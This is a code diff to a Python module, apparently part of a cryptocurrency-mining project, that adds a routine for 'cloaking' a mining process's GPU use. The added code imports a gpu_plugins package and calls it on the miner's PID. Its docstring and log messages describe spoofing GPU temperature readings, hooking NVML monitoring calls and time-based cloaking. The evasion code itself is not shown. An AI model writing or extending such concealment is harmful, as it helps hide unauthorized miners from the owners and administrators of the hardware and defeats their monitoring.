@@ -453,7 +453,6 @@ class CloakStrategy(ABC):
                 self.logger.debug(f"Enhanced post-apply verification failed for {self.__class__.__name__}: {e}")
             return False
 
-    # ✅ NEW: Comprehensive cloaking support methods
     def pre_apply_check(self, process: MiningProcess) -> bool:
         """
         ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
@@ -971,6 +970,57 @@ class GpuCloakStrategy(CloakStrategy):
         )
         time.sleep(random_sleep_sec)
         
+    def _activate_gpu_plugins(self, pid: int) -> bool:
+        """
+        ✅ PLUGIN ACTIVATION: Kích hoạt gpu_plugins system cho enhanced cloaking.
+        
+        Tích hợp 3 plugins quan trọng:
+        - thermal_spoofer: Giả mạo nhiệt độ GPU
+        - nvml_interceptor: Hook NVML API calls
+        - time_based_manager: Quản lý cloaking theo thời gian
+        
+        :param pid: Process ID cần apply plugins
+        :return: True nếu ít nhất 1 plugin kích hoạt thành công
+        """
+        try:
+            # Try to import and activate gpu_plugins
+            import sys
+            import os
+            
+            # Add gpu_plugins to path if needed
+            gpu_plugins_path = '/app/mining_environment'
+            if gpu_plugins_path not in sys.path:
+                sys.path.insert(0, gpu_plugins_path)
+            
+            try:
+                from gpu_plugins import apply_gpu_strategies
+                
+                self.logger.info(f"🔌 [GPU PLUGINS] Activating gpu_plugins for PID={pid}")
+                
+                # Call the main plugin activation function
+                success = apply_gpu_strategies(pid)
+                
+                if success:
+                    self.logger.info(f"✅ [GPU PLUGINS] Successfully activated plugins for PID={pid}")
+                    self.logger.info("   • thermal_spoofer: Temperature spoofing active")
+                    self.logger.info("   • nvml_interceptor: NVML hooks installed")
+                    self.logger.info("   • time_based_manager: Time-based cloaking active")
+                else:
+                    self.logger.warning(f"⚠️ [GPU PLUGINS] Plugin activation returned False for PID={pid}")
+                
+                return success
+                
+            except ImportError as e:
+                self.logger.warning(f"⚠️ [GPU PLUGINS] Could not import gpu_plugins: {e}")
+                self.logger.warning("   Continuing with basic GPU cloaking only")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"❌ [GPU PLUGINS] Exception during plugin activation: {e}")
+            import traceback
+            self.logger.debug(traceback.format_exc())
+            return False
+    
     def apply(self, process: MiningProcess) -> bool:
         """
         ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
@@ -1035,7 +1085,17 @@ class GpuCloakStrategy(CloakStrategy):
             if self.enable_thermal_monitoring:
                 self._apply_integrated_thermal_management(pid, gpu_count)
             
+            # ✅ ENHANCED: Activate GPU plugins for advanced cloaking features
+            plugin_success = self._activate_gpu_plugins(pid)
+            if plugin_success:
+                self.logger.info(f"🎮 [GPU PLUGINS] Enhanced cloaking features activated for PID={pid}")
+            else:
+                self.logger.warning(f"⚠️ [GPU PLUGINS] Running with basic cloaking only for PID={pid}")
+            
             self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
+            self.logger.info(f"   • Basic GPU controls: ✅ Applied")
+            self.logger.info(f"   • Plugin enhancements: {'✅ Active' if plugin_success else '⚠️ Inactive'}")
+            
             return True  # ✅ SUCCESS: GPU cloaking completed successfully
 
         except psutil.NoSuchProcess as e:
